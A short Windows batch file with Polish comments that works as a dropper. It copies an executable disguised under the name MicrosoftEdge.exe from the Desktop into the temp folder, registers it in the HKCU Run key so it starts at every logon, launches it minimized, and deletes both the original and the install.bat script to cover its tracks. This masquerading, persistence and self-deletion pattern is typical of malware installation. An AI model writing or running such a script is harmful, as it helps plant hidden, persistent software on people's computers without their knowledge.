@echo off
:: Ścieżki
set "src=%USERPROFILE%\Desktop\MicrosoftEdge.exe"
set "dest=%temp%\MicrosoftEdge.exe"

:: Kopiowanie pliku
copy "%src%" "%dest%" >nul

:: Dodanie do autostartu
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdge" /t REG_SZ /d "%dest%" /f >nul

:: Uruchomienie programu w tle
start "" /min "%dest%"

:: Czekaj 3 sekundy, by upewnić się, że wszystko zadziałało
timeout /t 3 >nul

:: Usuwanie plików
del /q "%src%" >nul 2>&1
del /q "%USERPROFILE%\Desktop\install.bat" >nul 2>&1

:: Wyjście
exit